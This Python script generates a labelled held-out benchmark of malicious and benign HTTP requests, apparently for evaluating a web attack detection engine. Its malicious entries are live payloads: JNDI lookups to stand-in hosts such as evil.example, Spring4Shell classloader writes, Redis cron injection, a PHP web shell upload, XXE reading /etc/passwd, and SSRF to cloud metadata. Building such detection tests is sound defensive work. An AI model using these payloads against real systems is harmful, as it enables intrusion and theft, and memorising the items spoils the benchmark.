#!/usr/bin/env python3
"""Generate heldout_v7.jsonl — clean held-out batch v7.

Families structurally absent from ALL v1-v6 tuning corpora:
HTTP parameter pollution, PHP type juggling / magic hashes, integer
overflow boundaries, JNDI/Log4Shell lookups, Spring4Shell classloader
binding, Redis/Memcached protocol injection, WebSocket abuse, Content-Type
confusion, CONNECT tunneling, open redirects, management/debug endpoints,
webhook/callback SSRF, multipart boundary tricks, HTTP/2 pseudo-headers.
"""
import json, hashlib

OUT = "benchmarks/real_comparative/corpus/heldout_v7.jsonl"

ATTACKS = {
 "parameter_pollution": [
  ("GET","/api/user","id=1&id=2",""),
  ("GET","/api/user","id=admin&id=1",""),
  ("GET","/api/items","id[]=1&id[]=2",""),
  ("GET","/api/items","id[0]=admin&id[1]=1",""),
  ("GET","/api/config","debug=false&debug=true",""),
  ("GET","/api/search","q=hello&q=world",""),
  ("POST","/api/transfer","","id=1&id=999"),
  ("GET","/api/profile","user=me&user=admin",""),
 ],
 "type_juggling": [
  ("GET","/api/login","username=admin&password=0e462097431906509019562988736854",""),
  ("GET","/api/check","token=0e123456789",""),
  ("GET","/api/item","id=0e123",""),
  ("GET","/api/auth","hash=240610708",""),
  ("POST","/api/login","","username[]=admin&password[]=x"),
  ("GET","/api/compare","a[]=1&b[]=2",""),
  ("GET","/api/calc","num=0x539",""),
  ("GET","/api/type","value=true&other=1",""),
 ],
 "integer_overflow": [
  ("GET","/api/cart","qty=2147483648",""),
  ("GET","/api/cart","qty=-2147483649",""),
  ("GET","/api/item","id=99999999999999999999",""),
  ("POST","/api/order","","amount=1e309"),
  ("GET","/api/price","price=0.00000000000000000001",""),
  ("GET","/api/points","score=18446744073709551615",""),
  ("POST","/api/transfer","","to=1&amount=9223372036854775808"),
  ("GET","/api/discount","percent=1000000",""),
 ],
 "jndi_injection": [
  ("GET","/api/search","q=${jndi:ldap://evil.example/x}",""),
  ("GET","/api/search","q=${jndi:rmi://169.254.169.254/x}",""),
  ("GET","/api/search","q=${${lower:j}ndi:${lower:l}dap://evil/x}",""),
  ("GET","/api/search","q=${j${::-n}di:ldap://evil/x}",""),
  ("POST","/api/comment","","text=${jndi:dns://evil.example}"),
  ("GET","/api/header","X-Api-Version=${jndi:ldap://evil/x}",""),
  ("GET","/api/log","msg=${jndi:iiop://evil:900/x}",""),
  ("GET","/api/search","q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fx%7D",""),
 ],
 "spring4shell": [
  ("POST","/api/apply","","class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",""),
  ("POST","/api/apply","","class.module.classLoader.DefaultAssertionStatus=false"),
  ("POST","/api/apply","","class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"),
  ("POST","/api/apply","","class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"),
  ("GET","/api/apply","class.module.classLoader.resources.context.parent.pipeline.first.pattern=test",""),
  ("POST","/api/apply","","class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell"),
 ],
 "protocol_injection": [
  ("POST","/api/cache","","cmd=SET+key+value%0d%0aGET+admin"),
  ("POST","/api/cache","","cmd=FLUSHALL%0d%0a"),
  ("GET","/api/store","key=x%0d%0aSET%20admin%201",""),
  ("POST","/api/mem","","data=get+/admin%0d%0a"),
  ("GET","/api/redis","cmd=EVAL+sha1+0+1",""),
  ("POST","/api/cache","","cmd=CONFIG+SET+dir+/var/spool/cron"),
  ("GET","/api/store","key=x%0A*3%0A%243%0ASET",""),
 ],
 "websocket_abuse": [
  ("GET","/ws/chat","","",{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Sec-WebSocket-Version":"13","Sec-WebSocket-Protocol":"chat, sql-injection"}),
  ("GET","/socket.io/","EIO=4&transport=polling&t=x&sid=<script>alert(1)</script>",""),
  ("GET","/ws","token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.","",{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Sec-WebSocket-Version":"13"}),
  ("GET","/ws/notifications","room=../../admin","",{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Sec-WebSocket-Version":"13"}),
  ("GET","/ws","message=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E","",{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Sec-WebSocket-Version":"13"}),
 ],
 "content_type_confusion": [
  ("POST","/api/data","",'<root><user>admin</user></root>',{"Content-Type":"application/json"}),
  ("POST","/api/data","",'{"user":"admin","role":"admin"}',{"Content-Type":"text/xml"}),
  ("POST","/api/data","",'{"a":1}',{"Content-Type":"application/x-www-form-urlencoded"}),
  ("POST","/api/data","",'a=1&b=2',{"Content-Type":"application/json"}),
  ("POST","/api/data","",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',{"Content-Type":"application/json"}),
  ("POST","/api/data","",'{"__proto__":{"admin":true}}',{"Content-Type":"text/plain"}),
 ],
 "connect_tunnel": [
  ("CONNECT","evil.example:443","",""),
  ("CONNECT","169.254.169.254:80","",""),
  ("CONNECT","internal.corp:22","",""),
  ("CONNECT","localhost:6379","",""),
  ("CONNECT","10.0.0.5:8080","",""),
  ("CONNECT","metadata.google.internal:80","",""),
 ],
 "open_redirect": [
  ("GET","/login","next=//evil.example",""),
  ("GET","/login","redirect=javascript:alert(1)",""),
  ("GET","/logout","url=data:text/html,<script>alert(1)</script>",""),
  ("GET","/auth/callback","return=%2f%2fevil.example",""),
  ("GET","/go","to=https://evil.example/phish",""),
  ("GET","/redirect","target=\\\\evil.example\\share",""),
  ("GET","/login","continue=//evil.example%2f@trusted.com",""),
  ("GET","/out","u=java\tscript:alert(1)",""),
 ],
 "management_endpoints": [
  ("GET","/actuator/env","",""),
  ("GET","/actuator/heapdump","",""),
  ("GET","/actuator/gateway/routes","",""),
  ("GET","/actuator/configprops","",""),
  ("GET","/debug/vars","",""),
  ("GET","/debug/pprof/heap","",""),
  ("GET","/_cat/indices?format=json","",""),
  ("GET","/metrics","",""),
  ("GET","/server-status","",""),
  ("GET","/jolokia/","",""),
  ("GET","/api/v1/namespaces/default/secrets","",""),
  ("GET","/containers/json?all=1","",""),
 ],
 "webhook_ssrf": [
  ("POST","/api/subscribe","","callback=http://169.254.169.254/latest/meta-data"),
  ("POST","/api/hooks","","webhook_url=http://localhost:8080/admin"),
  ("POST","/api/notify","","notify_url=http://192.168.1.1:8080/cgi-bin"),
  ("GET","/api/ping","pingback=http://internal.example/x",""),
  ("POST","/api/integration","","endpoint=172.16.0.1:9200/_search"),
  ("POST","/api/events","","delivery=http://0.0.0.0:22/"),
 ],
 "multipart_attacks": [
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.php;.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET[c]); ?>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="..%2f..%2fshell.php"\r\n\r\n<?php echo 1; ?>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename*=UTF-8\'\'..%2fetc%2fpasswd\r\n\r\nx\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Type: text/xml\r\n\r\n<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>\r\n--x--'),
  ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="a.php"\r\nContent-Type: application/octet-stream\r\nX-Evil: <?php phpinfo(); ?>\r\n\r\nGIF89a\r\n--x--'),
 ],
 "http2_pseudo": [
  ("GET","/",'x=1',"",{":path":"/admin","x-normal":"1"}),
  ("GET","/api","",'',{":authority":"evil.example",":method":"GET"}),
  ("POST","/",'a=1',"",{":path":"/../../etc/passwd"}),
  ("GET","/",'x=1',"",{":scheme":"http",":path":"//evil.example/x"}),
 ],
 "unicode_path_v2": [
  ("GET","/%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd","",""),
  ("GET","/admin%E3%80%82%2e%2e%2fetc/passwd","",""),
  ("GET","/static/..%c0%af..%c0%afetc%2fpasswd","",""),
  ("GET","/files/%u002e%u002e%u002fetc/passwd","",""),
 ],
}

BENIGN = [
 ("GET","/api/users","id=1&page=2",""),
 ("GET","/api/users","id=1&id=2",""),   # HPP-looking but both numeric ids — trap
 ("GET","/api/search","q=how+to+cook+rice",""),
 ("GET","/api/search","q=0e123+meaning",""),  # looks like magic hash, is text
 ("POST","/api/login","","username=admin&password=hunter2"),
 ("GET","/api/item","id=42",""),
 ("GET","/api/cart","qty=2",""),
 ("GET","/api/cart","qty=2147483647",""),   # INT32_MAX boundary, legit
 ("GET","/api/points","score=999",""),
 ("GET","/api/discount","percent=50",""),
 ("GET","/login","next=/dashboard",""),     # internal redirect — trap
 ("GET","/login","next=%2fprofile%2fsettings",""),
 ("GET","/logout","url=/home",""),
 ("GET","/go","to=https://docs.example.com/guide",""),  # external but clean https
 ("GET","/api/file","path=reports/2024/q4.pdf",""),
 ("GET","/api/download","file=invoice.pdf",""),
 ("POST","/api/data","",'{"user":"juan","role":"user"}'),
 ("POST","/api/data","",'{"message":"hello world"}',{"Content-Type":"application/json"}),
 ("POST","/api/data","",'{"a":1,"b":[1,2,3]}',{"Content-Type":"application/json"}),
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="photo.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<jpeg-bytes>\r\n--x--',{"Content-Type":"multipart/form-data; boundary=x"}),
 ("POST","/api/comment","","text=nice+post%21"),
 ("GET","/api/webhook","status=active",""),
 ("GET","/ws/chat","room=general","",{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Sec-WebSocket-Version":"13","Sec-WebSocket-Protocol":"chat"}),
 ("GET","/socket.io/","EIO=4&transport=polling&t=12345&sid=abc",""),
 ("GET","/metrics","format=prometheus",""),  # trap: /metrics is also attack path
 ("GET","/actuator/health","",""),
 ("GET","/api/namespaces","?limit=10",""),
 ("GET","/blog/post/hello-world","",""),
 ("GET","/api/i18n","?lang=ru&text=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82",""),
 ("GET","/api/i18n","?lang=zh&text=%E4%BD%A0%E5%A5%BD",""),
 ("POST","/api/notes","","text=iPhone15pro+review"),  # latin only — safe
 ("POST","/api/notes","","text=Mi+nota+iPhone15%20pro"),  # latin only
 ("GET","/api/search","q=C%3A%5Ctemp%5Creport.txt",""),   # windows path benign — trap
 ("GET","/api/file","f=/etc/hostname",""),               # /etc but benign file — trap
 ("GET","/api/items","?sort=name&order=asc",""),
 ("GET","/api/items","?filter[status]=active",""),
 ("GET","/api/items","?tags[]=a&tags[]=b",""),
 ("POST","/api/orders","",'{"items":[{"sku":"A1","qty":2}]}'),
 ("GET","/api/weather","?city=Santiago&units=metric",""),
 ("GET","/api/timer","?minutes=10&label=pasta",""),
 ("POST","/api/messages","","text=%F0%9F%98%80+gracias",""),
 ("GET","/api/export","?format=csv&from=2024-01-01",""),
 ("GET","/api/export","?format=csv&cell=hello",""),
 ("GET","/api/user","?fields=name,email",""),
 ("GET","/","x-test=1",""),
 ("OPTIONS","/api/data","",""),
 ("HEAD","/api/status","",""),
 ("GET","/api/health","",""),
 ("GET","/robots.txt","",""),
 ("GET","/sitemap.xml","",""),
]

def mk(case_id, cat, label, note, method, path, query, body, headers=None, split="held_out"):
    return {
        "case_id": case_id, "category": cat, "corpus": "heldout_v7",
        "corpus_sha256": None, "corpus_version": None,
        "label": label, "note": note,
        "request": {"body": body, "headers": headers or {}, "method": method,
                    "path": path, "query": query},
        "split": split,
        "split_reason": ("Frozen held-out batch v7: techniques absent from v1-v6 tuning."
                         if label == "malicious" else "Benign control written independently of engine internals."),
    }

notes = {c: f"v7 fresh techniques for {c}." for c in ATTACKS}
notes["benign"] = "Benign control v7."

cases=[]
for cat,payloads in ATTACKS.items():
    for i,(m,p,q,b,*rest) in enumerate(payloads):
        cases.append(mk(f"heldout_v7/{cat}-{i:02d}",cat,"malicious",notes[cat],m,p,q,b,rest[0] if rest else {}))
for i,(m,p,q,b,*rest) in enumerate(BENIGN):
    cases.append(mk(f"heldout_v7/benign-{i:03d}","benign","benign",notes["benign"],m,p,q,b,rest[0] if rest else {}))

with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in cases: f.write(json.dumps(c,ensure_ascii=False)+"\n")
lines=[json.loads(l) for l in open(OUT,encoding="utf-8")]
sha=hashlib.sha256(open(OUT,"rb").read()).hexdigest()
for c in lines: c["corpus_sha256"]=sha
with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in lines: f.write(json.dumps(c,ensure_ascii=False)+"\n")
mal=[c for c in cases if c["label"]=="malicious"]; ben=[c for c in cases if c["label"]=="benign"]
print(f"wrote {len(cases)} cases -> {OUT}")
print(f"malicious={len(mal)} benign={len(ben)} sha256={sha[:16]}")
from collections import Counter
print(Counter(c["category"] for c in mal))
